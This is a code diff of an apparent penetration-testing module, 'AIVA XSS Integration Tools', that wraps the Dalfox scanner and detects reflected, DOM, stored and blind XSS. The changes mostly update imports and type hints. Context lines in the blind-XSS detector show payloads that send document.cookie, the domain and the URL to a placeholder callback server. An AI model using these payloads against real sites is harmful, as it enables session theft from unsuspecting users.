@@ -15,30 +15,21 @@ AIVA XSS Integration Tools
 """
 
 import asyncio
+from dataclasses import asdict, dataclass
+from datetime import datetime
 import json
 import logging
 import os
 import re
 import subprocess
-import tempfile
 import time
-from dataclasses import dataclass, asdict
-from datetime import datetime
-from pathlib import Path
-from typing import Dict, List, Optional, Any, Tuple, Union
-from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
+from typing import Any
+from urllib.parse import parse_qs, quote, urlencode, urlparse
 
 import aiohttp
-import requests
+from aiva_common.enums import Severity
 from bs4 import BeautifulSoup
 from rich.console import Console
-from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, TextColumn
-from rich.prompt import Prompt, Confirm
-from rich.table import Table
-from rich.text import Text
-
-from aiva_common.enums import Severity
 
 console = Console()
 logger = logging.getLogger(__name__)
@@ -53,12 +44,12 @@ class XSSTarget:
     """XSS 攻擊目標"""
     url: str
     method: str = "GET"
-    parameters: Optional[Dict[str, str]] = None
-    headers: Optional[Dict[str, str]] = None
-    cookies: Optional[Dict[str, str]] = None
-    data: Optional[str] = None
-    forms: Optional[List[Dict]] = None
-    dom_sources: Optional[List[str]] = None
+    parameters: dict[str, str] | None = None
+    headers: dict[str, str] | None = None
+    cookies: dict[str, str] | None = None
+    data: str | None = None
+    forms: list[dict] | None = None
+    dom_sources: list[str] | None = None
     priority: str = "medium"  # high, medium, low
     
     def __post_init__(self):
@@ -88,7 +79,7 @@ class XSSVulnerability:
     exploitation_proof: str
     business_impact: str
     remediation: str
-    timestamp: Optional[str] = None
+    timestamp: str | None = None
     
     def __post_init__(self):
         if self.timestamp is None:
@@ -102,7 +93,7 @@ class DalfoxIntegration:
         self.dalfox_path = self._find_dalfox_path()
         self.scan_results = []
     
-    def _find_dalfox_path(self) -> Optional[str]:
+    def _find_dalfox_path(self) -> str | None:
         """查找 Dalfox 安裝路徑"""
         possible_paths = [
             "dalfox",
@@ -161,7 +152,7 @@ class DalfoxIntegration:
             console.print(f"[red]安裝 Dalfox 時發生錯誤: {e}[/red]")
             return False
     
-    async def scan_target(self, target: XSSTarget, options: Optional[Dict[str, Any]] = None) -> List[XSSVulnerability]:
+    async def scan_target(self, target: XSSTarget, options: dict[str, Any] | None = None) -> list[XSSVulnerability]:
         """使用 Dalfox 掃描目標"""
         if not self.dalfox_path:
             console.print("[yellow]Dalfox 未安裝，嘗試安裝...[/yellow]")
@@ -217,7 +208,7 @@ class DalfoxIntegration:
         
         return vulnerabilities
     
-    def _parse_dalfox_output(self, output: str, target_url: str) -> List[XSSVulnerability]:
+    def _parse_dalfox_output(self, output: str, target_url: str) -> list[XSSVulnerability]:
         """解析 Dalfox 輸出"""
         vulnerabilities = []
         
@@ -260,7 +251,7 @@ class XSSPayloadGenerator:
         self.payloads = self._load_payloads()
         self.context_payloads = self._load_context_specific_payloads()
     
-    def _load_payloads(self) -> Dict[str, List[str]]:
+    def _load_payloads(self) -> dict[str, list[str]]:
         """載入基礎 XSS 載荷"""
         return {
             'basic_reflected': [
@@ -313,7 +304,7 @@ class XSSPayloadGenerator:
             ]
         }
     
-    def _load_context_specific_payloads(self) -> Dict[str, List[str]]:
+    def _load_context_specific_payloads(self) -> dict[str, list[str]]:
         """載入上下文特定載荷"""
         return {
             'html_context': [
@@ -349,7 +340,7 @@ class XSSPayloadGenerator:
     
     def generate_payloads(self, xss_type: str = 'basic_reflected', 
                          context: str = 'html_context', 
-                         waf_bypass: bool = False) -> List[str]:
+                         waf_bypass: bool = False) -> list[str]:
         """生成特定類型的 XSS 載荷"""
         payloads = []
         
@@ -367,7 +358,7 @@ class XSSPayloadGenerator:
         
         return payloads
     
-    def generate_custom_payload(self, callback_url: Optional[str] = None, 
+    def generate_custom_payload(self, callback_url: str | None = None, 
                               data_to_extract: str = "document.cookie") -> str:
         """生成自定義載荷"""
         if callback_url:
@@ -391,7 +382,7 @@ class DOMXSSDetector:
             'location.href', 'location.assign', 'location.replace'
         ]
     
-    async def scan_dom_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
+    async def scan_dom_xss(self, target: XSSTarget) -> list[XSSVulnerability]:
         """掃描 DOM XSS 漏洞"""
         vulnerabilities = []
         
@@ -416,7 +407,7 @@ class DOMXSSDetector:
         
         return vulnerabilities
     
-    def _analyze_javascript(self, content: str, url: str) -> List[XSSVulnerability]:
+    def _analyze_javascript(self, content: str, url: str) -> list[XSSVulnerability]:
         """分析 JavaScript 代碼中的 DOM XSS"""
         vulnerabilities = []
         
@@ -453,7 +444,7 @@ class DOMXSSDetector:
         
         return vulnerabilities
     
-    async def _test_dom_payloads(self, target: XSSTarget, session: aiohttp.ClientSession) -> List[XSSVulnerability]:
+    async def _test_dom_payloads(self, target: XSSTarget, session: aiohttp.ClientSession) -> list[XSSVulnerability]:
         """動態測試 DOM XSS 載荷"""
         vulnerabilities = []
         
@@ -520,7 +511,7 @@ class StoredXSSDetector:
         ]
         self.unique_marker = f"STORED_XSS_{int(time.time())}"
     
-    async def scan_stored_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
+    async def scan_stored_xss(self, target: XSSTarget) -> list[XSSVulnerability]:
         """掃描存儲型 XSS 漏洞"""
         vulnerabilities = []
         
@@ -570,7 +561,7 @@ class StoredXSSDetector:
                 except Exception as e:
                     logger.warning(f"提交載荷失敗: {e}")
     
-    async def _check_stored_execution(self, target: XSSTarget, session: aiohttp.ClientSession) -> List[XSSVulnerability]:
+    async def _check_stored_execution(self, target: XSSTarget, session: aiohttp.ClientSession) -> list[XSSVulnerability]:
         """檢查存儲的載荷是否被執行"""
         vulnerabilities = []
         
@@ -632,12 +623,12 @@ class StoredXSSDetector:
 class BlindXSSDetector:
     """盲 XSS 檢測器"""
     
-    def __init__(self, callback_server: Optional[str] = None):
+    def __init__(self, callback_server: str | None = None):
         self.callback_server = callback_server or "http://your-blind-xss-server.com"
         self.session_id = f"blind_xss_{int(time.time())}"
         self.payloads = self._generate_blind_payloads()
     
-    def _generate_blind_payloads(self) -> List[str]:
+    def _generate_blind_payloads(self) -> list[str]:
         """生成盲 XSS 載荷"""
         return [
             f'<script>fetch("{self.callback_server}/callback?id={self.session_id}&data="+btoa(document.cookie+"|"+document.domain+"|"+window.location.href))</script>',
@@ -648,7 +639,7 @@ class BlindXSSDetector:
             f'<iframe src="javascript:fetch(\'{self.callback_server}/iframe?id={self.session_id}&data=\'+btoa(document.cookie+\'|\'+window.location.href))"></iframe>'
         ]
     
-    async def scan_blind_xss(self, target: XSSTarget) -> List[XSSVulnerability]:
+    async def scan_blind_xss(self, target: XSSTarget) -> list[XSSVulnerability]:
         """掃描盲 XSS 漏洞"""
         vulnerabilities = []
         
@@ -792,7 +783,7 @@ class XSSManager:
         self.blind_detector = BlindXSSDetector()
         self.scan_results = []
     
-    def _parse_target(self, target_url: str, options: Optional[Dict[str, Any]] = None) -> XSSTarget:
+    def _parse_target(self, target_url: str, options: dict[str, Any] | None = None) -> XSSTarget:
         """解析目標 URL"""
         options = options or {}
         parsed_url = urlparse(target_url)
@@ -810,7 +801,7 @@ class XSSManager:
             priority=options.get('priority', 'medium')
         )
     
-    async def comprehensive_scan(self, target_url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    async def comprehensive_scan(self, target_url: str, options: dict[str, Any] | None = None) -> dict[str, Any]:
         """綜合 XSS 掃描"""
         options = options or {}
         target = self._parse_target(target_url, options)
@@ -886,7 +877,7 @@ class XSSManager:
         console.print("[bold green]✅ XSS 掃描完成！[/bold green]")
         return results
     
-    async def _custom_xss_scan(self, target: XSSTarget) -> List[XSSVulnerability]:
+    async def _custom_xss_scan(self, target: XSSTarget) -> list[XSSVulnerability]:
         """自定義 XSS 掃描"""
         vulnerabilities = []
         
@@ -948,7 +939,7 @@ class XSSManager:
         # 簡化的反射檢查
         return payload in content or payload.replace('"', '&quot;') in content
     
-    def _generate_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
+    def _generate_summary(self, results: dict[str, Any]) -> dict[str, Any]:
         """生成掃描摘要"""
         all_vulns = []
         
